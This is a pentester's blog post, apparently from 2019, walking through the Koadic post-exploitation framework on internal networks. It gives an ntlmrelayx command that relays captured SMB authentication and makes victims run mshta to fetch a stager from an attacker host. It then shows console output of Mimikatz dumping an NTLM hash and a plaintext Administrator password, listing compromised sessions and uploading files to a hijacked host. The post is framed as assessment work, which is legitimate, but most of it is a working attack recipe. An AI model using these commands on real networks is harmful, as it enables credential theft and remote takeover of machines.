@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>How I Use Koadic on Internals :: H4cklife!! — No-life it</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Overview I LOVE KOADIC!! Yes this doesn&#39;t work out of the box against Windows 10&#43; machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it&#39;s organization and implementation of Mimikatz which is probably the real MVP of the tool."/>
+<meta name="keywords" content="Hacking"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/h4cklife.org/posts/how-i-use-koadic-on-internals/" />
+
+
+<link rel="stylesheet" href="/h4cklife.org/assets/style.css">
+
+
+<link rel="stylesheet" href="/h4cklife.org/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/h4cklife.org/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/h4cklife.org/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="How I Use Koadic on Internals"/>
+<meta name="twitter:description" content="Overview I LOVE KOADIC!! Yes this doesn&#39;t work out of the box against Windows 10&#43; machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it&#39;s organization and implementation of Mimikatz which is probably the real MVP of the tool."/>
+
+
+
+<meta property="og:title" content="How I Use Koadic on Internals" />
+<meta property="og:description" content="Overview I LOVE KOADIC!! Yes this doesn&#39;t work out of the box against Windows 10&#43; machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it&#39;s organization and implementation of Mimikatz which is probably the real MVP of the tool." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/h4cklife.org/posts/how-i-use-koadic-on-internals/" /><meta property="article:published_time" content="2019-08-02T19:48:17-06:00"/>
+<meta property="article:modified_time" content="2019-08-02T19:48:17-06:00"/><meta property="og:site_name" content="H4cklife!!" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/h4cklife.org" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">H4cklife!!</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/h4cklife.org/about/">About</a></li>
+        
+      
+        
+          <li><a href="/h4cklife.org/beefhook/">Beefhooks</a></li>
+        
+      
+        
+          <li><a href="/h4cklife.org/wallpapers/">Wallpapers</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/h4cklife.org/about/">About</a></li>
+      
+    
+      
+        <li><a href="/h4cklife.org/beefhook/">Beefhooks</a></li>
+      
+    
+      
+        <li><a href="/h4cklife.org/wallpapers/">Wallpapers</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="/h4cklife.org/posts/how-i-use-koadic-on-internals/">How I Use Koadic on Internals</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            2019-08-02
+        </span>
+      
+      
+      
+        <span class="post-read-time">— 5 min read</span>
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+
+<h1 id="overview">Overview</h1>
+
+<p style="text-align:justify;">
+<b>I LOVE KOADIC!!</b> Yes this doesn't work out of the box against Windows 10+ machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it's organization and implementation of Mimikatz which is probably the real MVP of the tool. It also does a fantastic job of enumerating domain information that can be used alongside of your <a href="https://github.com/BloodHoundAD">Bloodhound</a> enumeration as well. I also really really love the <b>creds</b> functionality and how it stores captured credentials and allows you to search through them at will. After you conduct your domain enumeration it even identifies credentials that belong to <b>Domain Admins</b>!</p>
+
+<p><center><a href="https://github.com/zerosum0x0/koadic">Download Koadic!</a></center></p>
+
+<h3 id="how-i-use-it-on-internals">How I Use it on Internals</h3>
+
+<p style="text-align:justify;">
+So what I do on internals is have NTLMRELAYx execute the staging command when using <a href="https://github.com/SpiderLabs/Responder">Responder</a> to man-in-the-middle LLMNR traffic. Since this isn't a full blown <a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">tutorial</a> on that process and one focused solely on Koadic I'll leave you with the command I generally use with NTLMRELAYx:
+</p>
+
+<p><center></p>
+
+<pre><code class="language-bash">sudo ntlmrelayx.py -tf smb_off_hosts -smb2support --enum-local-admins -of 'save_the_NTLMv2hashes.txt' -c 'mshta http://AttackingHost:9999/sploit'      
+</code></pre>
+
+<p></center></p>
+
+<p style="text-align:justify;">
+Because Koadic lets you run Mimikatz as soon as you can get a connect-back this will result in <b>RAINING SHELLS WITH RAINING PLAIN-TEXT CREDS!!!!</b> No joke, you could get sets of Domain/Enterprise Admin creds AND hundreds of sessions if SMB Signing is disabled on internal networks. Yes, by doing this I have had over 200 shells/zombies at a once before on an internal assessment (counter productive and unnecessary I know). It was primarily due to the high volume of SMB traffic.  
+</p>
+
+<h3 id="what-i-did-for-you-guys">What I Did for You Guys</h3>
+
+<p style="text-align:justify;">
+So for this blog, I took some time and spun up an AWS Windows 2012 instance (something seen often on internals) just so I can show off some of the functionality. As usual the next section is going to be pretty fast pace so you guys can ingest this stuff as quickly and as clearly as possible. Let's get you guys to a point where you can wreck with this thing already!</p>
+
+<h1 id="hacking-things-tldrs-start-here">Hacking things - TLDRs Start Here ⤵</h1>
+
+<p style="text-align:justify;">
+When you start using Koadic obviously you need to pip3 the "reqs" and get it setup for usage. After you launch it you should see the main screen. In this screenshot you can see I set the end part of the staging URL to be sploit by using <b>[set ENDPOINT sploit]</b>. I also set up the stager to run Mimikatz on anything that connects to it by configuring the module using <b>[set MODULE implant/inject/mimikatz_dotnet2js]</b>. If you have a network with a lot of:
+</p>
+
+<p><center>
+<figure>
+<img src="../../images/Why I Love Koadic/Options.png" alt="Koadic Settings" />
+<figcaption>
+<center>Koadic Settings</center>
+</figcaption>
+</figure>
+</center></p>
+
+<p>For demonstrative purposes I executed the mshta through windows explorer like so:</p>
+
+<p><center>
+<figure>
+<img src="../../images/Why I Love Koadic/launching_on_windows.png" alt="Executing Stager on Windows" />
+<figcaption>
+<center>Executing Stager on Windows</center>
+</figcaption>
+</figure>
+</center></p>
+
+<p style="text-align:justify;">
+Once you get an active session (zombie) the fun really begins. Because I had the module set to run Mimikatz immediately on connect you can see that plain-text creds are dumped as soon as the Windows Server 2012 host calls back to my attacking machine. You can see that both a  NTLM hash and plan-text credentials were recovered:
+</p>
+
+<pre><code class="language-bash">
+(koadic: sta/js/mshta)$ run
+[+] Spawned a stager at http://AttackingIP:9999/sploit
+[!] Dont edit this URL! (See: 'help portfwd')
+[&gt;] mshta http://AttackingIP:9999/sploit
+[+] Zombie 0: Staging new connection (100.27.25.153)
+[+] Zombie 0: WIN-LKC4723RPHF\Administrator* @ WIN-LKC4723RPHF -- Windows Server 2012 Standard
+[*] Zombie 0: Job 0 (stager/js/mshta) created.
+[+] Zombie 0: Job 0 (stager/js/mshta) privilege::debug -&gt; got SeDebugPrivilege!
+[+] Zombie 0: Job 0 (stager/js/mshta) token::elevate -&gt; got SYSTEM!
+[+] Zombie 0: Job 0 (stager/js/mshta) completed.
+[+] Zombie 0: Job 0 (stager/js/mshta) Results
+
+msv credentials
+===============
+
+NTLM                              SHA1                                      Username       Domain
+----                              ----                                      --------       ------
+9554475ea7e7f7c98c617ddbba4c55d8  b77ce05a098def8bd2b29a096faaf8957e7282a1  Administrator  WIN-LKC4723RPHF
+
+wdigest credentials
+===================
+
+Username          Domain           Password
+--------          ------           --------
+(null)            (null)           (null)
+Administrator     WIN-LKC4723RPHF  qLTWjy%P=9
+WIN-LKC4723RPHF\$  WORKGROUP        (null)
+
+kerberos credentials
+====================
+
+Username          Domain           Password
+--------          ------           --------
+(null)            (null)           (null)
+Administrator     WIN-LKC4723RPHF  (null)
+win-lkc4723rphf\$  WORKGROUP        (null)
+</code></pre>
+
+<figcaption>
+<center>Dumping Creds upon Connection</center>
+</figcaption>
+
+<p style="text-align:justify;">
+If you want to check the status of the compromised hosts that you have so far you can use the command <b>[Zombies]</b>.
+</p>
+
+<pre><code class="language-bash">
+(koadic: sta/js/mshta)$ zombies
+
+        ID   IP              STATUS  LAST SEEN       
+        ---  ---------       ------- ------------    
+        0    75.233.122.16   Dead    2019-08-03 04:22:37
+        1*   171.31.92.16    Alive   2019-08-03 04:25:55
+
+Use &quot;zombies ID&quot; for detailed information about a session.
+Use &quot;zombies IP&quot; for sessions on a particular host.
+Use &quot;zombies DOMAIN&quot; for sessions on a particular Windows domain.
+Use &quot;zombies killed&quot; for sessions that have been manually killed.
+</code></pre>
+
+<figcaption>
+<center>Active and Dead Sessions</center>
+</figcaption>
+
+<p style="text-align:justify;">
+If you've got any active jobs running, the <b>[Jobs]</b> command will display them for you so you can see what finished and what failed:
+</p>
+
+<pre><code class="language-bash">(koadic: sta/js/mshta)$ jobs
+
+        ID   STATUS    ZOMBIE              NAME                                    
+        ---- --------- ----------          --------------------                    
+        0    Complete  171.31.92.16 (1)    stager/js/mshta                         
+</code></pre>
+
+<figcaption>
+<center>Koadic Displaying a jobs status</center>
+</figcaption>
+
+<p style="text-align:justify;">
+Similarly, <b>[Creds]</b> will display all of the credentials Koadic was able to capture and display them in nice, neat output for you:
+</p>
+
+<pre><code class="language-bash">(koadic: sta/js/mshta)$ creds
+
+        Cred ID  IP               USERNAME            DOMAIN              PASSWORD                 NTLM                                      
+        -------  --               --------            ------              --------                 ----                                      
+        0        171.31.92.16     Administrator       WIN-LKC4723RPHF     qLTWjy%P=9               9554475ea7e7f7c98c617ddbba4c55d8          
+
+</code></pre>
+
+<figcaption>
+<center>Koadic Displaying Saved Creds</center>
+</figcaption>
+
+<p style="text-align:justify;">
+Koadic has a bunch of other handy modules. Just for a practicality I chose to show you guys the file upload utility. Here, I just uploaded a picture that I had lying around:
+</p>
+
+<pre><code class="language-bash">(koadic: sta/js/mshta)$ use implant/util/upload_file
+(koadic: imp/uti/upload_file)$ options
+
+        NAME        VALUE               REQ     DESCRIPTION     
+        -----       ------------        ----    -------------   
+        LFILE                           yes     local file to upload
+        DIRECTORY   %TEMP%              no      writeable directory
+        ZOMBIE      ALL                 yes     the zombie to target
+
+(koadic: imp/uti/upload_file)$ set LFILE Knuclkes.png
+[+] LFILE =&gt; Knuclkes.png
+(koadic: imp/uti/upload_file)$ set DIRECTORY c:\\users\\administrator\\desktop
+[+] DIRECTORY =&gt; c:\\users\\administrator\\desktop
+(koadic: imp/uti/upload_file)$ run
+[*] Zombie 0: Job 1 (implant/util/upload_file) created.
+[*] Zombie 1: Job 2 (implant/util/upload_file) created.
+[+] Zombie 1: Job 2 (implant/util/upload_file) completed.
+</code></pre>
+
+<figcaption>
+<center>Options Used to Upload Files</center>
+</figcaption>
+
+<p>And the result:</p>
+
+<p><center>
+<figure>
+<img src="../../images/Why I Love Koadic/upload_results.png" alt="Result of File Upload" />
+<figcaption>
+<center>Result of File Upload</center>
+</figcaption>
+</figure>
+</center></p>
+
+<p>At this point you pretty much get the picture. Koadic can do a ton of other cool things too. <b>When it works it destroys!</b></p>
+
+<pre><code class="language-c">____________
+&lt; K0ad1c R0x &gt;
+------------
+\     ____________
+ \    |__________|
+     /           /\
+    /           /  \
+   /___________/___/|
+   |          |     |
+   |  ==\ /== |     |
+   |   O   O  | \ \ |
+   |     &lt;    |  \ \|
+  /|          |   \ \
+ / |  \_____/ |   / /
+/ /|          |  / /|
+/||\|          | /||\/
+   -------------|   
+       | |    | |
+      &lt;__/    \__&gt;
+</code></pre>
+
+<p>For those of you that care here&rsquo;s my test boxes system information:</p>
+
+<p><center>
+<figure>
+<img src="../../images/Why I Love Koadic/sysinfo.png" alt="Image of Windows 2012 information" />
+<figcaption>
+<center>Image of Windows Server 2012 Test Machine</center>
+</figcaption>
+</figure>
+</center></p>
+
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="/h4cklife.org/posts/installing-covenantv3.0-on-ubuntu-19-2019/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Installing Covenant v3.0 on Ubuntu 19</span>
+              </a>
+            </span>
+          
+          
+            <span class="button next">
+              <a href="/h4cklife.org/posts/what-its-like-being-a-pentester-after-oscp/">
+                <span class="button__text">What It&#39;s Like Being a Pentester After OSCP</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">Copyright 2019 😜</div>
+    
+  </div>
+</footer>
+
+<script src="/h4cklife.org/assets/main.js"></script>
+<script src="/h4cklife.org/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
